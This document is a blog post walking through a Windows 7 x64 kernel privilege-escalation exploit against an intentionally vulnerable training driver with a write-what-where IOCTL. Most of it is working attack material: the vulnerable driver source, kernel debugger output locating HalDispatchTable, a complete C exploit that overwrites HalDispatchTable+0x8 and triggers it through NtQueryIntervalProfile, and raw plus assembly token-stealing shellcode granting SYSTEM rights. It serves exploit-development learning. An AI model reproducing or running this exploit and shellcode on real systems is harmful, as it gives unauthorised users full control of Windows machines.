---
layout: post
title:  "Driver write-what-where vulnerability"
---

In this article, we will exploit a write-what-where vulnerability in Windows 7 
x64. To do that, we will use the last level of 
[0vercl0k](https://twitter.com/0vercl0k): the level 3. We need to do some 
changes to make a driver which work on a x64 system:

```c
#include <Ntifs.h>
#include <stdio.h>
#include <string.h>

#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)

typedef unsigned int DWORD;
typedef unsigned char* PBYTE;
typedef unsigned char BYTE;

//
DRIVER_UNLOAD Unload;
DRIVER_INITIALIZE DriverEntry;
DRIVER_DISPATCH handleIOCTLs;
DRIVER_DISPATCH handleIRP;
//

typedef struct
{
    PDWORD64 where;
    DWORD64 what;
} L33TNESS,
*PL33TNESS;

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj , PUNICODE_STRING pRegistryPath)
{
    DWORD i = 0;
    NTSTATUS status;
    UNICODE_STRING deviceName = {0}, symlinkName = {0};
    PDEVICE_OBJECT pDevice = NULL;

    pDriverObj->DriverUnload = Unload;
    DbgPrint("[ Loading.. ]\r\n");

    RtlInitUnicodeString(&deviceName, L"\\Device\\3");
    RtlInitUnicodeString(&symlinkName, L"\\DosDevices\\3");

    DbgPrint("[ Creating the device...]\n");
    IoCreateDevice(
        pDriverObj,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &pDevice
    );

    DbgPrint("[ Linking...]\n");
    IoCreateSymbolicLink(&symlinkName, &deviceName);

    for(; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        pDriverObj->MajorFunction[i] = handleIRP;

    pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = handleIOCTLs;
    return STATUS_SUCCESS;
}

NTSTATUS handleIRP(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    return STATUS_SUCCESS;
}

NTSTATUS handleIOCTLs(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    PIO_STACK_LOCATION pIoStackLocation = NULL;
    PL33TNESS ptr = NULL;
    DWORD ioControlCode = 0, inputBufferLength = 0;
    PVOID inputBuffer = 0;

    pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
    ioControlCode = pIoStackLocation->Parameters.DeviceIoControl.IoControlCode;
    inputBufferLength = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
    inputBuffer = pIrp->AssociatedIrp.SystemBuffer;

    switch(ioControlCode)
    {
        case IOCTL_WRIT:
        {
            if(inputBufferLength != 0 && inputBufferLength >= (sizeof(DWORD*) * 2))
            {
                ptr = (PL33TNESS)inputBuffer;

                /* DROP IT LIKE ITS HOT, DROP IT LIKE ITS HOT */
                *ptr->where = ptr->what;
            }
            else
                DbgPrint("You must supply a buffer formated like that: [@address to write][value to be writed].\n");

            break;
        }
    }

    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return pIrp->IoStatus.Status;
}

VOID Unload(PDRIVER_OBJECT pDrivObj)
{
    DbgPrint("[ Unloading.. ]\n");
    return;
}
```

This time, we can see that we can write anything and where we want. But how to 
execute a code with the SYSTEM right with that? `NtQueryIntervalProfile` will 
help us.


## HalDispatchTable is our friend

Let’s see what this function do:

```
kd> u nt!NtQueryIntervalProfile
nt!NtQueryIntervalProfile:
fffff800`029fff00 48895c2408      mov     qword ptr [rsp+8],rbx
fffff800`029fff05 57              push    rdi
fffff800`029fff06 4883ec20        sub     rsp,20h
fffff800`029fff0a 488bda          mov     rbx,rdx
fffff800`029fff0d 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff800`029fff16 408ab8f6010000  mov     dil,byte ptr [rax+1F6h]
fffff800`029fff1d 4084ff          test    dil,dil
fffff800`029fff20 7416            je      nt!NtQueryIntervalProfile+0x38 (fffff800`029fff38)
kd> u
nt!NtQueryIntervalProfile+0x22:
fffff800`029fff22 488b05d730ebff  mov     rax,qword ptr [nt!MmUserProbeAddress (fffff800`028b3000)]
fffff800`029fff29 483bd0          cmp     rdx,rax
fffff800`029fff2c 480f43d0        cmovae  rdx,rax
fffff800`029fff30 8b02            mov     eax,dword ptr [rdx]
fffff800`029fff32 8902            mov     dword ptr [rdx],eax
fffff800`029fff34 eb02            jmp     nt!NtQueryIntervalProfile+0x38 (fffff800`029fff38)
fffff800`029fff36 eb14            jmp     nt!NtQueryIntervalProfile+0x4c (fffff800`029fff4c)
fffff800`029fff38 e8830affff      call    nt!KeQueryIntervalProfile (fffff800`029f09c0)

kd> u nt!KeQueryIntervalProfile
nt!KeQueryIntervalProfile:
fffff800`029f09c0 4883ec38        sub     rsp,38h
fffff800`029f09c4 85c9            test    ecx,ecx
fffff800`029f09c6 7508            jne     nt!KeQueryIntervalProfile+0x10 (fffff800`029f09d0)
fffff800`029f09c8 8b05b645e0ff    mov     eax,dword ptr [nt!KiProfileInterval (fffff800`027f4f84)]
fffff800`029f09ce eb3c            jmp     nt!KeQueryIntervalProfile+0x4c (fffff800`029f0a0c)
fffff800`029f09d0 83f901          cmp     ecx,1
fffff800`029f09d3 7508            jne     nt!KeQueryIntervalProfile+0x1d (fffff800`029f09dd)
fffff800`029f09d5 8b0515b8e8ff    mov     eax,dword ptr [nt!KiProfileAlignmentFixupInterval (fffff800`0287c1f0)]
kd> u
nt!KeQueryIntervalProfile+0x1b:
fffff800`029f09db eb2f            jmp     nt!KeQueryIntervalProfile+0x4c (fffff800`029f0a0c)
fffff800`029f09dd ba0c000000      mov     edx,0Ch
fffff800`029f09e2 894c2420        mov     dword ptr [rsp+20h],ecx
fffff800`029f09e6 4c8d4c2440      lea     r9,[rsp+40h]
fffff800`029f09eb 8d4af5          lea     ecx,[rdx-0Bh]
fffff800`029f09ee 4c8d442420      lea     r8,[rsp+20h]
fffff800`029f09f3 ff156f52e0ff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff800`027f5c68)]
fffff800`029f09f9 85c0            test    eax,eax
``` 

We can see that if we call `NtQueryIntervalProfile` in ring3, Windows will call 
`KeQueryIntervalProfile` in ring0 and the function pointed by 
`nt!HalDispatchTable+0x8`! But what is `HalDispatchTable`? ReactOS will help us:

```c
typedef struct {
	ULONG Version;
	pHalQuerySystemInformation HalQuerySystemInformation;
	pHalSetSystemInformation HalSetSystemInformation;
	pHalQueryBusSlots HalQueryBusSlots;
	ULONG Spare1;
	pHalExamineMBR HalExamineMBR;
#if 1 /* Not present in WDK 7600 */
	pHalIoAssignDriveLetters HalIoAssignDriveLetters;
#endif
	pHalIoReadPartitionTable HalIoReadPartitionTable;
	pHalIoSetPartitionInformation HalIoSetPartitionInformation;
	pHalIoWritePartitionTable HalIoWritePartitionTable;
	pHalHandlerForBus HalReferenceHandlerForBus;
	pHalReferenceBusHandler HalReferenceBusHandler;
	pHalReferenceBusHandler HalDereferenceBusHandler;
	pHalInitPnpDriver HalInitPnpDriver;
	pHalInitPowerManagement HalInitPowerManagement;
	pHalGetDmaAdapter HalGetDmaAdapter;
	pHalGetInterruptTranslator HalGetInterruptTranslator;
	pHalStartMirroring HalStartMirroring;
	pHalEndMirroring HalEndMirroring;
	pHalMirrorPhysicalMemory HalMirrorPhysicalMemory;
	pHalEndOfBoot HalEndOfBoot;
	pHalMirrorVerify HalMirrorVerify;
	pHalGetAcpiTable HalGetCachedAcpiTable;
	pHalSetPciErrorHandlerCallback  HalSetPciErrorHandlerCallback;
#if defined(_IA64_)
pHalGetErrorCapList HalGetErrorCapList;
	pHalInjectError HalInjectError;
#endif
} HAL_DISPATCH, *PHAL_DISPATCH;
```

```
kd> dq nt!HalDispatchTable
fffff800`027f5c60  00000000`00000004 fffff800`02c268e8
fffff800`027f5c70  fffff800`02c27470 fffff800`029f2d60
fffff800`027f5c80  00000000`00000000 fffff800`026cacb0
fffff800`027f5c90  fffff800`029a16b0 fffff800`029a2000

kd> u poi(nt!HalDispatchTable+0x8)
fffff800`02c268e8 fff3            push    rbx
fffff800`02c268ea 55              push    rbp
[...]
```

We can see that at `HalDispatchTable+0x8` store a pointer to 
`HalQuerySystemInformation`. Therefore, we just need to modify 
`HalDispatchTable+0x8` to point to our shellcode and call 
`NtQueryIntervalProfile` to execute our shellcode in ring0. Fortunely for us, 
`HalDispatchTable` is exported by name by `ntoskrnl.exe`, so we can found this 
address easily:

- We load `ntoskrnl.exe` with `LoadLibrary`
- We use `GetProcAddress` to find `HalDispatchTable` address in userland
- We search the image base address of `ntoskrnl` in kernelland with 
`NtQuerySystemInformation(SystemModuleInformation)`
- And we obtain the final address with a little calculation: `HalDispatchTable` 
userland address - `ntoskrnl` userland address + `ntoskrnl` image base address 
in kernelland

Finally, we need to replace the address at `HalDispatchTable+0x8` with a valid 
kernel function address to decrease the chances to get a BSOD. I have used 
`KeGetCurrentThread`:

```
kd> u nt!KeGetCurrentThread
nt!PsGetCurrentThread:
fffff800`026ca2c0 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff800`026ca2c9 c3              ret
```


## Final exploit

I have used the same shellcode of previous levels to copy the system token in 
my process.

```
E:\>exploit.exe
[+] Search address of notskrnl.exe...
[+] HalDispatchTable in userland: 0x401F0C60
[+] HalDispatchTable in kernelland: 0x27F1C60
[+] Search NtAllocateVirtualMemory...
[+] Copy the shellcode...
[+] Execute NtQueryIntervalProfile
[+] New username: SystÞme
[+] Modify HalDispatchTable+0x8 to point on KeGetCurrentThread
[+] KeGetCurrentThread in userland: 0x400C92C0
[+] KeGetCurrentThread in kernelland: 0x26CA2C0
[+] Executing a new command console to test it...
```

```c
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>

#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\3"

typedef enum {
	SystemBasicInformation, 
	SystemProcessorInformation, 
	SystemPerformanceInformation, 
	SystemTimeOfDayInformation, 
	SystemPathInformation, 
	SystemProcessInformation, 
	SystemCallCountInformation, 
	SystemDeviceInformation, 
	SystemProcessorPerformanceInformation, 
	SystemFlagsInformation, 
	SystemCallTimeInformation, 
	SystemModuleInformation
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef struct
{
    PVOID Reserved1;
    PVOID Reserved2;
    PVOID ImageBaseAddress;
    ULONG ImageSize;
    ULONG Flags;
    WORD Id;
    WORD Rank;
    WORD w018;
    WORD NameOffset;
    BYTE Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct
{
    ULONG ModulesCount;
    SYSTEM_MODULE Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef DWORD (WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef DWORD (WINAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef DWORD (WINAPI* _NtQueryIntervalProfile)(DWORD, PULONG); 

typedef struct
{
    PDWORD64 where;
    DWORD64 what;
} L33TNESS,
*PL33TNESS;


BYTE shellcode[] =  "\x53\x51\x52\x57\x56\x6A\xFF\x6A\xFF\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x52\x70\x48\x81\xC2\x88\x01"
                    "\x00\x00\x48\x89\xD3\x48\x8B\x42\xF8\x48\x83\xF8\x04\x74\x19\x48\xB9\x41\x41\x41\x41\x41\x41\x41\x41\x48\x39"
                    "\xC8\x74\x11\x48\x8B\x12\x48\x39\xDA\x74\x31\xEB\xDD\x48\x89\x54\x24\x08\xEB\x04\x48\x89\x14\x24\x48\xC7\xC1"
                    "\xFF\xFF\xFF\xFF\x48\x39\x0C\x24\x74\xDE\x48\x39\x4C\x24\x08\x74\xD7\x5F\x5E\x48\x8B\x86\x80\x00\x00\x00\x48"
                    "\x89\x87\x80\x00\x00\x00\x5E\x5F\x5A\x59\x5B\xC3";


void replacePattern(char buffer[], int bufferSize, DWORD64 pattern, DWORD64 value) {
    BOOL found = FALSE;
    int i;
         
    for (i = 0; i < bufferSize; i++) {
        if (*(PDWORD64)(buffer + i) == pattern) {
            found = TRUE;
            *(PDWORD64)(buffer + i) = value;
        }
    }
         
    return found;
}                    

PVOID getKernelBase() {
	PVOID ntdll = NULL;
	_NtQuerySystemInformation NtQuerySystemInformation = NULL;
	DWORD sizeInfo = 0;
	DWORD error = 0;
	PSYSTEM_MODULE_INFORMATION moduleList = NULL;
	PVOID kernelBase = NULL;
	int i = 0;

	ntdll = GetModuleHandle("ntdll.dll");
    if (ntdll == NULL) {
    	printf("[-] Can't found ntdll");
    	return NULL;
    }

    NtQuerySystemInformation = GetProcAddress(ntdll, "NtQuerySystemInformation");

    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &sizeInfo);
    if (sizeInfo == 0) {
    	printf("[-] NtQuerySystemInformation return 0 for information size\n");
    	return NULL;
    }

    moduleList = (PSYSTEM_MODULE_INFORMATION) malloc(sizeInfo);
    error = NtQuerySystemInformation(SystemModuleInformation, moduleList, sizeInfo, NULL);
    if (error != 0) {
    	printf("[-] NtQuerySystemInformation error: 0x%X (struct size: 0x%X)\n", error, sizeInfo);
    	free(moduleList);
    	return NULL;
    }

    kernelBase = moduleList->Modules[0].ImageBaseAddress;
    free(moduleList);

	return kernelBase;
}

int main()
{
    HANDLE hDevice = NULL;
    L33TNESS l33t = {0};
    DWORD byte = 0;
    PVOID ntoskrnl = NULL;
    PVOID HalDispatchTable = NULL;
    PVOID originalValue = NULL;
    PVOID kernelBase = NULL;
    DWORD error = 0;
    PVOID leetAddress = 0x1337;
    DWORD sizeofShellcode = sizeof(shellcode);
    _NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
    _NtQueryIntervalProfile NtQueryIntervalProfile = NULL;
    PVOID KeGetCurrentThread = NULL;
    ULONG wtf = 0;
    char username[255] = {0};
    DWORD sizeofUsername = 255;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    printf("[+] Search address of notskrnl.exe...\n");
    ntoskrnl = LoadLibrary("ntoskrnl.exe");
    if (ntoskrnl == NULL) {
    	printf("[-] Can't load ntoskrnl.exe\n");
    	return EXIT_FAILURE;
    }

    HalDispatchTable = GetProcAddress(ntoskrnl, "HalDispatchTable");
    if (HalDispatchTable == NULL) {
    	printf("[-] Can't found HalDispatchTable in ntoskrnl.exe\n");
    	return EXIT_FAILURE;
    }
    printf("[+] HalDispatchTable in userland: 0x%X\n", HalDispatchTable);

    kernelBase = getKernelBase();
    if (kernelBase == NULL) {
    	printf("[-] Can't find the kernel base\n");
    	return EXIT_FAILURE;
    }

    HalDispatchTable = (DWORD64) HalDispatchTable - (DWORD64) ntoskrnl + (DWORD64) kernelBase;
	printf("[+] HalDispatchTable in kernelland: 0x%X\n", HalDispatchTable);

	printf("[+] Search NtAllocateVirtualMemory...\n");
    NtAllocateVirtualMemory = (_NtAllocateVirtualMemory) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
    if(NtAllocateVirtualMemory == NULL) {
        printf("[-] Error with GetProcAddress : %.8x\n", GetLastError());
        return EXIT_FAILURE;
    }
   
    printf("[+] Copy the shellcode...\n");
    error = NtAllocateVirtualMemory(GetCurrentProcess(), &leetAddress, NULL, &sizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(error != 0) {
        printf("[-] Error with NtAllocateVirtualMemory : %.8x\n", error);
        return EXIT_FAILURE;
    }
    replacePattern(shellcode, sizeof(shellcode), 0x4141414141414141, GetCurrentProcessId()); // Process PID
    memcpy(leetAddress, shellcode, sizeof(shellcode));

    hDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error with Createfile : %.8x.\n", GetLastError());
        return EXIT_FAILURE;
    }

    l33t.where = (DWORD64) HalDispatchTable + sizeof(PVOID);
    l33t.what = leetAddress;
    DeviceIoControl(hDevice, IOCTL_WRIT, &l33t, sizeof(l33t), NULL, 0, &byte, NULL);

    NtQueryIntervalProfile = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");
        if (NtQueryIntervalProfile == NULL) {
    	printf("[-] Can't find NtQueryIntervalProfile\n");
    	return EXIT_FAILURE;
    }

    printf("[+] Execute NtQueryIntervalProfile\n");
    NtQueryIntervalProfile(2, &wtf);

    GetUserNameA(username, &sizeofUsername);
    printf("[+] New username: %s\n", username);

    printf("[+] Modify HalDispatchTable+0x8 to point on KeGetCurrentThread\n");
    KeGetCurrentThread = GetProcAddress(ntoskrnl, "KeGetCurrentThread");
    if (KeGetCurrentThread == NULL) {
        printf("[-] Can't found KeGetCurrentThread in ntoskrnl.exe\n");
        return EXIT_FAILURE;
    }

    printf("[+] KeGetCurrentThread in userland: 0x%X\n", KeGetCurrentThread);
    KeGetCurrentThread = (DWORD64) KeGetCurrentThread - (DWORD64) ntoskrnl + (DWORD64) kernelBase;
    printf("[+] KeGetCurrentThread in kernelland: 0x%X\n", KeGetCurrentThread);

    l33t.where = (DWORD64) HalDispatchTable + sizeof(PVOID);
    l33t.what = KeGetCurrentThread;
    DeviceIoControl(hDevice, IOCTL_WRIT, &l33t, sizeof(l33t), NULL, 0, &byte, NULL);
    CloseHandle(hDevice);

    printf("[+] Executing a new command console to test it...\n");
    si.cb = sizeof(si); 
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    return EXIT_SUCCESS;
}
```

```nasm
format PE64 GUI 4.0

start:

; We save the registers
push rbx
push rcx
push rdx
push rdi
push rsi

;--------------------------------
; 			Stack
;--------------------------------
; RSP-8: EPROCESS+0x188 system
;--------------------------------
; RSP-4: EPROCESS+0x188 exploit
;--------------------------------
push 0xFFFFFFFFFFFFFFFF
push 0xFFFFFFFFFFFFFFFF

mov rdx, [gs:qword 0x188]   ; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			
mov rdx, [rdx + 0x70]       ; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS
add rdx, 0x188              ; +0x188 ActiveProcessLinks : _LIST_ENTRY
mov rbx, rdx                ; Our linked list \o/ We save the first structure

searchProcess:
mov rax, [rdx - 0x8]        ; +0x180 UniqueProcessId
cmp rax, 0x4                ; SYSTEM PID
je sysProcFound
mov rcx, 0x4141414141414141 ; Our exploit PID
cmp rax, rcx                ; cmp reg64, imm64 don't exist
je exploitProcFound
 
nextProcess:
mov rdx, [rdx]              ; Next process (Flink)
cmp rdx, rbx                ; We are back at the starting point
je retApp
jmp searchProcess           ; We loop!
 
sysProcFound:
mov [rsp+8], rdx
jmp allPIDFound
 
exploitProcFound:
mov [rsp], rdx
 
allPIDFound:
mov rcx, 0xFFFFFFFFFFFFFFFF
cmp [rsp], rcx
je nextProcess
cmp [rsp+8], rcx
je nextProcess

; We copy the SYSTEM token
pop rdi ; Exploit
pop rsi ; System
mov rax, [rsi + 0x80]       ; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF
mov [rdi + 0x80], rax
 
retApp:
; Restore the registers
pop rsi
pop rdi
pop rdx
pop rcx
pop rbx
ret
```